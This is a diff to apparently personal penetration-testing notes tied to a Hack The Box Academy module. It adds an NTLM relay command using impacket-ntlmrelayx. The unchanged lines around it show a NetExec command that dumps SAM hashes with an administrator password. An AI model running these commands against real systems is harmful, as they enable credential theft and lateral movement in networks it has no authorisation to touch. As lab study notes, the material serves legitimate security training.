@@ -105,5 +105,10 @@ NetExec(Extracting Hash):
 nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 ```
 
+NTLM-Relay Attack:
+```
+#We can perform NTLM relay attack by using impacket-ntlmrelayx
+impacket-ntlmrelayx --no-http-server -smb2support -t <ip>
+```
 
 Ref: https://academy.hackthebox.com/app/module/112/section/1067
